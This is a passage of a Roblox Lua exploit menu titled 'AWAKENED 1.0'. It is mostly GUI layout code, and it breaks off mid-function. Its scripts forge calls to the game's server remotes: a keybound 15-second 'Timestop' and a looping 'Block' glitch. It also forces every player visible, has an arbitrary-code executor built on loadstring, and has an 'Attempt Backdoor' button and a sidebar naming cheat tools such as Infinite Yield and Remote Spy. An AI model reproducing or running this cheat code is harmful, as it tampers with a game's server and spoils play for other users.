ReduceLag.Font = Enum.Font.SourceSans
ReduceLag.Text = "Reduce Lag"
ReduceLag.TextColor3 = Color3.fromRGB(0, 0, 0)
ReduceLag.TextSize = 14.000
ReduceLag.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
ReduceLag.TextStrokeTransparency = 0.000

DeleteFire.Name = "DeleteFire"
DeleteFire.Parent = ScrollingFrame
DeleteFire.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DeleteFire.BorderColor3 = Color3.fromRGB(255, 255, 255)
DeleteFire.BorderSizePixel = 2
DeleteFire.Position = UDim2.new(0.0170000009, 0, 0.175999999, 0)
DeleteFire.Size = UDim2.new(0, 389, 0, 36)
DeleteFire.Font = Enum.Font.SourceSans
DeleteFire.Text = "Delete Fire"
DeleteFire.TextColor3 = Color3.fromRGB(0, 0, 0)
DeleteFire.TextSize = 14.000
DeleteFire.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
DeleteFire.TextStrokeTransparency = 0.000

AttemptServerside.Name = "AttemptServerside"
AttemptServerside.Parent = ScrollingFrame
AttemptServerside.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AttemptServerside.BorderColor3 = Color3.fromRGB(255, 255, 255)
AttemptServerside.BorderSizePixel = 2
AttemptServerside.Position = UDim2.new(0.0170000009, 0, 0.300000012, 0)
AttemptServerside.Size = UDim2.new(0, 389, 0, 36)
AttemptServerside.Font = Enum.Font.SourceSans
AttemptServerside.Text = "Attempt Backdoor"
AttemptServerside.TextColor3 = Color3.fromRGB(0, 0, 0)
AttemptServerside.TextSize = 14.000
AttemptServerside.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
AttemptServerside.TextStrokeTransparency = 0.000

RespawnSameSpot.Name = "RespawnSameSpot"
RespawnSameSpot.Parent = ScrollingFrame
RespawnSameSpot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RespawnSameSpot.BorderColor3 = Color3.fromRGB(255, 255, 255)
RespawnSameSpot.BorderSizePixel = 2
RespawnSameSpot.Position = UDim2.new(0.0170000009, 0, 0.425000012, 0)
RespawnSameSpot.Size = UDim2.new(0, 389, 0, 36)
RespawnSameSpot.Font = Enum.Font.SourceSans
RespawnSameSpot.Text = "Death Pos Reset"
RespawnSameSpot.TextColor3 = Color3.fromRGB(0, 0, 0)
RespawnSameSpot.TextSize = 14.000
RespawnSameSpot.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
RespawnSameSpot.TextStrokeTransparency = 0.000

Settings_2.Name = "Settings"
Settings_2.Parent = Frame
Settings_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Settings_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Settings_2.BorderSizePixel = 0
Settings_2.Size = UDim2.new(0, 33, 0, 29)
Settings_2.Image = "http://www.roblox.com/asset/?id=14306059173"

Close.Name = "Close"
Close.Parent = Frame
Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.957364321, 0, 0, 0)
Close.Size = UDim2.new(0, 22, 0, 28)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 14.000

Minimize.Name = "Minimize"
Minimize.Parent = Frame
Minimize.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Minimize.BorderColor3 = Color3.fromRGB(0, 0, 0)
Minimize.BorderSizePixel = 0
Minimize.Position = UDim2.new(0.908914745, 0, 0, 0)
Minimize.Size = UDim2.new(0, 25, 0, 29)
Minimize.Font = Enum.Font.SourceSans
Minimize.Text = "-"
Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
Minimize.TextSize = 14.000

SHub.Name = "SHub"
SHub.Parent = Frame
SHub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
SHub.BorderSizePixel = 0
SHub.Position = UDim2.new(0.0639534891, 0, 0, 0)
SHub.Size = UDim2.new(0, 25, 0, 29)
SHub.Font = Enum.Font.SourceSans
SHub.Text = "+"
SHub.TextColor3 = Color3.fromRGB(255, 255, 255)
SHub.TextSize = 14.000

Sidebar.Name = "Sidebar"
Sidebar.Parent = Frame
Sidebar.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
Sidebar.BackgroundTransparency = 0.300
Sidebar.BorderColor3 = Color3.fromRGB(0, 0, 0)
Sidebar.BorderSizePixel = 5
Sidebar.Position = UDim2.new(-0.160852715, 0, 0.965517223, 0)
Sidebar.Size = UDim2.new(0, 77, 0, 224)
Sidebar.Visible = false

ScrollingFrame_2.Parent = Sidebar
ScrollingFrame_2.Active = true
ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_2.BackgroundTransparency = 1.000
ScrollingFrame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame_2.BorderSizePixel = 0
ScrollingFrame_2.Size = UDim2.new(0, 77, 0, 224)
ScrollingFrame_2.CanvasSize = UDim2.new(0, 0, 5, 0)
ScrollingFrame_2.ScrollBarThickness = 10

IY.Name = "IY"
IY.Parent = ScrollingFrame_2
IY.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
IY.BorderColor3 = Color3.fromRGB(0, 0, 0)
IY.BorderSizePixel = 0
IY.Position = UDim2.new(0, 0, 0.00999999978, 0)
IY.Size = UDim2.new(0, 64, 0, 29)
IY.Font = Enum.Font.SourceSans
IY.Text = "Infinite Yield"
IY.TextColor3 = Color3.fromRGB(255, 255, 255)
IY.TextScaled = true
IY.TextSize = 14.000
IY.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
IY.TextWrapped = true

Dex.Name = "Dex"
Dex.Parent = ScrollingFrame_2
Dex.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Dex.BorderColor3 = Color3.fromRGB(0, 0, 0)
Dex.BorderSizePixel = 0
Dex.Position = UDim2.new(0, 0, 0.0401785709, 0)
Dex.Size = UDim2.new(0, 64, 0, 29)
Dex.Font = Enum.Font.SourceSans
Dex.Text = "Dex"
Dex.TextColor3 = Color3.fromRGB(255, 255, 255)
Dex.TextScaled = true
Dex.TextSize = 14.000
Dex.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Dex.TextWrapped = true

SAF.Name = "SAF"
SAF.Parent = ScrollingFrame_2
SAF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SAF.BorderColor3 = Color3.fromRGB(0, 0, 0)
SAF.BorderSizePixel = 0
SAF.Position = UDim2.new(0, 0, 0.100000001, 0)
SAF.Size = UDim2.new(0, 64, 0, 29)
SAF.Font = Enum.Font.SourceSans
SAF.Text = "SA F"
SAF.TextColor3 = Color3.fromRGB(255, 255, 255)
SAF.TextScaled = true
SAF.TextSize = 14.000
SAF.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
SAF.TextWrapped = true

HBEGUI.Name = "HBEGUI"
HBEGUI.Parent = ScrollingFrame_2
HBEGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HBEGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
HBEGUI.BorderSizePixel = 0
HBEGUI.Position = UDim2.new(0, 0, 0.129999995, 0)
HBEGUI.Size = UDim2.new(0, 64, 0, 29)
HBEGUI.Font = Enum.Font.SourceSans
HBEGUI.Text = "HBE GUI"
HBEGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
HBEGUI.TextScaled = true
HBEGUI.TextSize = 14.000
HBEGUI.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
HBEGUI.TextWrapped = true

NA.Name = "NA"
NA.Parent = ScrollingFrame_2
NA.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
NA.BorderColor3 = Color3.fromRGB(0, 0, 0)
NA.BorderSizePixel = 0
NA.Position = UDim2.new(0, 0, 0.159999996, 0)
NA.Size = UDim2.new(0, 64, 0, 29)
NA.Font = Enum.Font.SourceSans
NA.Text = "Nameless Admin"
NA.TextColor3 = Color3.fromRGB(255, 255, 255)
NA.TextScaled = true
NA.TextSize = 14.000
NA.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
NA.TextWrapped = true

Hydroxide.Name = "Hydroxide"
Hydroxide.Parent = ScrollingFrame_2
Hydroxide.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hydroxide.BorderColor3 = Color3.fromRGB(0, 0, 0)
Hydroxide.BorderSizePixel = 0
Hydroxide.Position = UDim2.new(0, 0, 0.189999998, 0)
Hydroxide.Size = UDim2.new(0, 64, 0, 29)
Hydroxide.Font = Enum.Font.SourceSans
Hydroxide.Text = "Hydroxide"
Hydroxide.TextColor3 = Color3.fromRGB(255, 255, 255)
Hydroxide.TextScaled = true
Hydroxide.TextSize = 14.000
Hydroxide.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Hydroxide.TextWrapped = true

Rspy.Name = "Rspy"
Rspy.Parent = ScrollingFrame_2
Rspy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Rspy.BorderColor3 = Color3.fromRGB(0, 0, 0)
Rspy.BorderSizePixel = 0
Rspy.Position = UDim2.new(0, 0, 0.0700000003, 0)
Rspy.Size = UDim2.new(0, 64, 0, 29)
Rspy.Font = Enum.Font.SourceSans
Rspy.Text = "Remote Spy"
Rspy.TextColor3 = Color3.fromRGB(255, 255, 255)
Rspy.TextScaled = true
Rspy.TextSize = 14.000
Rspy.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Rspy.TextWrapped = true

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.112403102, 0, 0, 0)
Title.Size = UDim2.new(0, 197, 0, 28)
Title.Font = Enum.Font.SciFi
Title.Text = "AWAKENED 1.0"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14.000

Home_2.Name = "Home"
Home_2.Parent = Frame
Home_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home_2.BackgroundTransparency = 1.000
Home_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_2.BorderSizePixel = 0
Home_2.Position = UDim2.new(0.139534891, 0, 0, 0)
Home_2.Size = UDim2.new(0, 25, 0, 25)
Home_2.Image = "http://www.roblox.com/asset/?id=279461710"

Clock.Name = "Clock"
Clock.Parent = Frame
Clock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Clock.BackgroundTransparency = 1.000
Clock.BorderColor3 = Color3.fromRGB(0, 0, 0)
Clock.BorderSizePixel = 0
Clock.Position = UDim2.new(0.709302306, 0, 0.0344827585, 0)
Clock.Size = UDim2.new(0, 103, 0, 22)
Clock.Font = Enum.Font.SourceSans
Clock.Text = "12:00AM"
Clock.TextColor3 = Color3.fromRGB(255, 255, 255)
Clock.TextScaled = true
Clock.TextSize = 14.000
Clock.TextWrapped = true

ProfilePicture.Name = "ProfilePicture"
ProfilePicture.Parent = Frame
ProfilePicture.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProfilePicture.BackgroundTransparency = 1.000
ProfilePicture.BorderColor3 = Color3.fromRGB(0, 0, 0)
ProfilePicture.BorderSizePixel = 0
ProfilePicture.Position = UDim2.new(0.389534891, 0, 0, 0)
ProfilePicture.Size = UDim2.new(0, 25, 0, 25)
ProfilePicture.Image = "rbxassetid://1"

SidebarMusic.Name = "SidebarMusic"
SidebarMusic.Parent = Frame
SidebarMusic.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
SidebarMusic.BackgroundTransparency = 0.300
SidebarMusic.BorderColor3 = Color3.fromRGB(0, 0, 0)
SidebarMusic.BorderSizePixel = 5
SidebarMusic.Position = UDim2.new(1.00999999, 0, 0.966000021, 0)
SidebarMusic.Size = UDim2.new(0, 77, 0, 224)
SidebarMusic.Visible = false

ScrollingFrame_3.Parent = SidebarMusic
ScrollingFrame_3.Active = true
ScrollingFrame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_3.BackgroundTransparency = 1.000
ScrollingFrame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame_3.BorderSizePixel = 0
ScrollingFrame_3.Size = UDim2.new(0, 77, 0, 224)
ScrollingFrame_3.ScrollBarThickness = 10
ScrollingFrame_3.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left

Lofi.Name = "Lofi"
Lofi.Parent = ScrollingFrame_3
Lofi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Lofi.BorderColor3 = Color3.fromRGB(0, 0, 0)
Lofi.BorderSizePixel = 0
Lofi.Position = UDim2.new(0.169, 0, 0.0299999993, 0)
Lofi.Size = UDim2.new(0, 64, 0, 29)
Lofi.Font = Enum.Font.SourceSans
Lofi.Text = "Lofi Playlist"
Lofi.TextColor3 = Color3.fromRGB(255, 255, 255)
Lofi.TextScaled = true
Lofi.TextSize = 14.000
Lofi.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Lofi.TextWrapped = true

Music.Name = "Music"
Music.Parent = Frame
Music.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Music.BackgroundTransparency = 1.000
Music.BorderColor3 = Color3.fromRGB(0, 0, 0)
Music.BorderSizePixel = 0
Music.Position = UDim2.new(0.691860437, 0, 0, 0)
Music.Size = UDim2.new(0, 25, 0, 25)
Music.Image = "rbxassetid://12159177184"

FullView.Name = "FullView"
FullView.Parent = ScreenGui
FullView.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
FullView.BackgroundTransparency = 0.300
FullView.BorderColor3 = Color3.fromRGB(0, 0, 0)
FullView.BorderSizePixel = 5
FullView.Position = UDim2.new(0, 0, 0.436090231, 0)
FullView.Size = UDim2.new(0, 27, 0, 36)
FullView.Visible = false
FullView.Font = Enum.Font.SourceSans
FullView.Text = "+"
FullView.TextColor3 = Color3.fromRGB(0, 0, 0)
FullView.TextScaled = true
FullView.TextSize = 14.000
FullView.TextWrapped = true

SFX.Name = "SFX"
SFX.Parent = ScreenGui

Music_2.Name = "Music"
Music_2.Parent = SFX

Rock.Name = "Rock"
Rock.Parent = Music_2

Lofi_2.Name = "Lofi"
Lofi_2.Parent = Music_2

Retro.Name = "Retro"
Retro.Parent = Music_2

UI.Name = "UI"
UI.Parent = SFX

-- Scripts:
wait(1.5)
local function IMQOZV_fake_script() -- Frame.DragGUI 
	local script = Instance.new('LocalScript', Frame)

	--// Services
	local Players = game:GetService('Players')
	local UIS = game:GetService("UserInputService")
	
	--// Variables
	local UI = script.Parent
	
	local Player = Players.LocalPlayer
	local Mouse = Player:GetMouse()
	
	local Hovered = false
	local Holding = false
	local MoveCon = nil
	
	local InitialX, InitialY, UIInitialPos
	
	--// Functions
	
	local function Drag()
		if Holding == false then MoveCon:Disconnect(); return end
		local distanceMovedX = InitialX - Mouse.X
		local distanceMovedY = InitialY - Mouse.Y
	
		UI.Position = UIInitialPos - UDim2.new(0, distanceMovedX, 0, distanceMovedY)
	end
	
	--// Connections
	
	UI.MouseEnter:Connect(function()
		Hovered = true
	end)
	
	UI.MouseLeave:Connect(function()
		Hovered = false
	end)
	
	UIS.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			Holding = Hovered
			if Holding then
				InitialX, InitialY = Mouse.X, Mouse.Y
				UIInitialPos = UI.Position
	
				MoveCon = Mouse.Move:Connect(Drag)
			end
		end
	end)
	
	UIS.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			Holding = false
		end
	end)
end
coroutine.wrap(IMQOZV_fake_script)()
local function OFIT_fake_script() -- Tab1.Tab1 
	local script = Instance.new('LocalScript', Tab1)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = true
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(OFIT_fake_script)()
local function RCUMDK_fake_script() -- Tab2.Tab2 
	local script = Instance.new('LocalScript', Tab2)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = true
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(RCUMDK_fake_script)()
local function ZWOQYU_fake_script() -- Tab4.Tab4 
	local script = Instance.new('LocalScript', Tab4)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = true
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(ZWOQYU_fake_script)()
local function MLFUQD_fake_script() -- Tab3.Tab3 
	local script = Instance.new('LocalScript', Tab3)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = true
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(MLFUQD_fake_script)()
local function NFXPS_fake_script() -- Tab6.Tab6 
	local script = Instance.new('LocalScript', Tab6)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = true
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(NFXPS_fake_script)()
local function CPALW_fake_script() -- Tab5.Tab5 
	local script = Instance.new('LocalScript', Tab5)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = true
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(CPALW_fake_script)()
local function EVAYD_fake_script() -- Executor.Executor 
	local script = Instance.new('LocalScript', Executor)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Executor.Visible = true
	end)
end
coroutine.wrap(EVAYD_fake_script)()
local function AOOV_fake_script() -- Tab7.Tab7 
	local script = Instance.new('LocalScript', Tab7)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = true
		tabs.Home.Visible = false
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(AOOV_fake_script)()
local function LJKCXW_fake_script() -- _15SecondTSButton.ButtonManager 
	local script = Instance.new('LocalScript', _15SecondTSButton)

	local on = false
	local off = true
	local ESB = script.Parent
	local KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
	
	local function getKeyCodeFromString(keyString)
		local keyName = keyString:match("Enum%.KeyCode%.(.+)")
		if keyName then
			local keyCode = Enum.KeyCode[keyName]
			if keyCode then
				return keyCode
			else
				error(keyName .. " is not a valid KeyCode")
			end
		else
			error("Keybind format is incorrect. Please use 'Enum.KeyCode.<KeyName>'")
		end
	end
	
	while not KEYBIND:match("Enum%.KeyCode%.") do
		wait(0.1)
		KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
	end
	
	local keyCode = getKeyCodeFromString(KEYBIND)
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("15 SECOND TS ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	
			game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
				if on == true and not gameProcessed then
					if input.KeyCode == keyCode then
						print("BOOM!!!")
						local args = {
							[1] = 15,
							[2] = "diego"
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Timestop"):FireServer(unpack(args))
					end
				end
			end)
	
		elseif on == true then
			on = false
			off = true
			print("15 SECOND TS OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(LJKCXW_fake_script)()
local function YLVV_fake_script() -- Keybind.ReturnToOrigin 
	local script = Instance.new('LocalScript', Keybind)

	local textBox = script.Parent
	
	while wait() do
		local text = textBox.Text
	
		if text == "" then
			wait(1.5)
			textBox.Text = "Keybind here."
		elseif text == "b" or text == "B" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.B"
		elseif text == "c" or text == "C" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.C"
		elseif text == "e" or text == "E" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.E"
		elseif text == "f" or text == "F" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F"
		elseif text == "g" or text == "G" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.G"
		elseif text == "h" or text == "H" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.H"
		elseif text == "i" or text == "I" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.I"
		elseif text == "j" or text == "J" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.J"
		elseif text == "k" or text == "K" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.K"
		elseif text == "l" or text == "L" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.L"
		elseif text == "m" or text == "M" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.M"
		elseif text == "n" or text == "N" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.N"
		elseif text == "o" or text == "O" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.O"
		elseif text == "p" or text == "P" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.P"
		elseif text == "q" or text == "Q" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Q"
		elseif text == "r" or text == "R" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.R"
		elseif text == "t" or text == "T" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.T"
		elseif text == "u" or text == "U" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.U"
		elseif text == "v" or text == "V" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.V"
		elseif text == "x" or text == "X" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.X"
		elseif text == "y" or text == "Y" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Y"
		elseif text == "z" or text == "Z" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Z"
		elseif text == "1" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.One"
		elseif text == "2" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Two"
		elseif text == "3" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Three"
		elseif text == "4" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Four"
		elseif text == "5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Five"
		elseif text == "6" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Six"
		elseif text == "7" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Seven"
		elseif text == "8" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Eight"
		elseif text == "9" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Nine"
		elseif text == "0" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.Zero"
		elseif text == "F1" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F1"
		elseif text == "F2" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F2"
		elseif text == "F3" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F3"
		elseif text == "F4" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F4"
		elseif text == "F5" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F5"
		elseif text == "F6" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F6"
		elseif text == "F7" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F7"
		elseif text == "F8" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F8"
		elseif text == "F9" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F9"
		elseif text == "F10" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F10"
		elseif text == "F11" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F11"
		elseif text == "F12" then
			wait(1.5)
			textBox.Text = "Enum.KeyCode.F12"
		end
	end
	
	
end
coroutine.wrap(YLVV_fake_script)()
local function PKHCKPM_fake_script() -- AntiTEButton.ButtonManager 
	local script = Instance.new('LocalScript', AntiTEButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
	
		if off == true then
			on = true
			off = false
			print("ANTI TE ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	while on == true do
		wait(0.3)
			local function setCharacterTransparency(character, transparency)
				if character then
					for _, part in ipairs(character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.Transparency = transparency
						end
					end
				end
			end
	
			local function setAllPlayersTransparency(transparency)
				local players = game:GetService("Players")
	
				for _, player in ipairs(players:GetPlayers()) do
					local character = player.Character or player.CharacterAdded:Wait()
					setCharacterTransparency(character, transparency)
				end
			end
	
			setAllPlayersTransparency(0)
		end
		elseif on == true then
			on = false
			off = true
			print("ANTI TE OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(PKHCKPM_fake_script)()
local function XIKBMQW_fake_script() -- BlockGlitch_2.ButtonManager 
	local script = Instance.new('LocalScript', BlockGlitch_2)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
	
		if off == true then
			on = true
			off = false
			print("BLOCK BUG ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
	
			while on == true do
				local args = {
					[1] = "Alternate",
					[2] = "Block",
					[3] = true
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
				wait(0.1)
			end
	
		elseif on == true then
			on = false
			off = true
			local args = {
				[1] = "Alternate",
				[2] = "Block",
				[3] = false
			}
			game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
			print("BLOCK BUG OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(XIKBMQW_fake_script)()
local function VZFTZBN_fake_script() -- Execute.LocalScript 
	local script = Instance.new('LocalScript', Execute)

	script.Parent.Activated:Connect(function()
		loadstring(script.Parent.Parent.TextBox.Text)
	end)
end
coroutine.wrap(VZFTZBN_fake_script)()
local function NHDBA_fake_script() -- Clear.LocalScript 
	local script = Instance.new('LocalScript', Clear)

	script.Parent.Activated:Connect(function()
		script.Parent.Parent.TextBox.Text = "--WRITE YOUR SCRIPT"
	end)
end
coroutine.wrap(NHDBA_fake_script)()
local function MZXAGPF_fake_script() -- Welcome.LocalScript 
	local script = Instance.new('LocalScript', Welcome)

	local lp = game.Players.LocalPlayer
	script.Parent.Text = "Welcome, "..lp.Name.."!"
end
coroutine.wrap(MZXAGPF_fake_script)()
local function YWYSS_fake_script() -- Quote.LocalScript 
	local script = Instance.new('LocalScript', Quote)

	local numbers = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
	local randomIndex = math.random(1, #numbers)
	local chosenNumber = numbers[randomIndex]
	
	if chosenNumber == 1 then
		script.Parent.Text = "Down to cause chaos?"
	elseif chosenNumber == 2 then
		script.Parent.Text = "Let's get this party started!"
	elseif chosenNumber == 3 then
		script.Parent.Text = "What's it gonna be today, "..game.Players.LocalPlayer.Name.."?"
	elseif chosenNumber == 4 then
		script.Parent.Text = "You are the storm that is approaching!"
	elseif chosenNumber == 5 then
		script.Parent.Text = "Well, isn't this quite the moment?"
	elseif chosenNumber == 6 then
		script.Parent.Text = "Turn this place into a slaughterfest!"
	elseif chosenNumber == 7 then
		script.Parent.Text = "How's it going?"
	elseif chosenNumber == 8 then
		script.Parent.Text = "Let's crush this!"
	elseif chosenNumber == 9 then
		script.Parent.Text = "We got this."
	elseif chosenNumber == 10 then
		script.Parent.Text = "Ready to kill?"
	end
end
coroutine.wrap(YWYSS_fake_script)()
local function SGRYFKP_fake_script() -- TextBox_2.EnsureConstantInvite 
